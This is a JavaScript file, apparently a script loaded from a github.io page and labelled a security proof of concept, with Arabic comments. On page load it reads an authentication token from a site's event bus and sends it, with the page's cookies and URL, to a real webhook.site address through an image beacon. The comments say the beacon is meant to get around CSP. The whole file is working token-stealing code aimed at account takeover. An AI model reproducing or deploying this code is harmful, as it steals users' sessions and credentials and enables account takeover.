// Path: https://egyhaker.github.io/script-loader/main.js

(function() {
    console.log("%c⚠️ Security PoC: Monitoring Event Bus for Auth Tokens...", "color: yellow; font-weight: bold;");

    const WEBHOOK_URL = "https://webhook.site/80fc42ae-6762-46f9-8c4d-46641ae6bafe";

    function exfiltrate(data) {
        // استخدام Image beacon لتجاوز بعض قيود CSP التي قد تمنع fetch
        const img = new Image();
        const encodedData = btoa(JSON.stringify(data));
        img.src = `${WEBHOOK_URL}/leak?d=${encodedData}`;
    }

    function captureToken() {
        try {
            // الوصول إلى ناقل الأحداث الذي حددته
            const bus = window._async_define_cached_dependencies && window._async_define_cached_dependencies["events-bus"];
            
            if (bus) {
                const events = bus.events || bus._events || (typeof bus.getEvents === 'function' ? bus.getEvents() : null);
                
                if (events && Array.isArray(events)) {
                    // البحث عن حدث تسجيل الدخول الناجح
                    const authEvent = events.find(e => e.args && e.args[0] === "AUTH-SUCCESS-EVENT-v1");
                    
                    if (authEvent && authEvent.args[1] && authEvent.args[1].token) {
                        const token = authEvent.args[1].token;
                        console.log("%c✅ Token Found!", "color: green; font-weight: bold;");
                        
                        exfiltrate({
                            status: "success",
                            type: "ATO_TOKEN",
                            url: window.location.href,
                            token: token,
                            cookies: document.cookie
                        });
                        return true;
                    }
                }
            }
        } catch (e) {
            console.error("Extraction error:", e);
        }
        return false;
    }

    // محاولة الاستخراج فور التحميل
    if (!captureToken()) {
        // إذا لم يجد التوكن فوراً، ينتظر قليلاً (في حال كان التحميل جارياً)
        setTimeout(captureToken, 3000);
    }
})();
